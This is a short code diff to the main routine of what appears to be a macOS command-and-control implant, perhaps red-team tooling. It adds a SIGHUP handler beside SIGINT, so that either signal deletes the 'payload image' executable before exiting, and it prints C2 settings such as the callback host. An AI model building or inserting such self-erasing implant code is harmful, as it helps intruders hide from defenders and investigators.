@@ -5,15 +5,16 @@
 #include <signal.h>
 
 // Signal handler function
-void handleSIGINT(int signal) {
-    NSLog(@"🔥 Received SIGINT (Ctrl-C). Quick remove the payload image!");
+void handleSignal(int signal) {
+    NSLog(@"🔥 Received SIGNAL (Ctrl-C). Quickly remove the payload image!");
     BOOL deletionSuccess = [SystemInfoHelper deleteExecutable];
     exit(0);
 }
 
 int main(int argc, const char * argv[]) {
     @autoreleasepool {
-        signal(SIGINT, handleSIGINT);
+        signal(SIGINT, handleSignal);
+        signal(SIGHUP, handleSignal);
 
         NSLog(@"C2 Configuration Data:");
         NSLog(@"Callback Host: %@", [HTTPC2Config callbackHost]);
